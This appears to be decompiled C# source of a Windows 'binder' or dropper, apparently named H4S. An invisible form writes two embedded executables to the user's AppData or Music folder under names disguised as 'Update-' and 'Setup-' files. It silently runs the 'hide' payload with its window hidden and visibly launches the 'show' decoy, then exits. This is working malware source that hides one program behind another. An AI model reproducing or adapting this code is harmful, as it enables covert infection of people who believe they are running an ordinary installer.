using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using H4S.My;
using H4S.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace H4S;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(117, 111);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Random random = new Random();
		VBMath.Randomize((double)random.Next());
		try
		{
			string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData() + "\\Update-" + Conversion.Int(VBMath.Rnd() * 1000000f) + ".exe";
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text, Resources.hide, false);
			Interaction.Shell(text, (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic() + "\\Update-" + Conversion.Int(VBMath.Rnd() * 1000000f) + ".exe";
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text, Resources.hide, false);
				Interaction.Shell(text, (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		try
		{
			string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData() + "\\Setup-" + Conversion.Int(VBMath.Rnd() * 1000000f) + ".exe";
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text, Resources.show, false);
			Process.Start(text);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			try
			{
				string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic() + "\\Setup-" + Conversion.Int(VBMath.Rnd() * 1000000f) + ".exe";
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text, Resources.show, false);
				Process.Start(text);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}
}
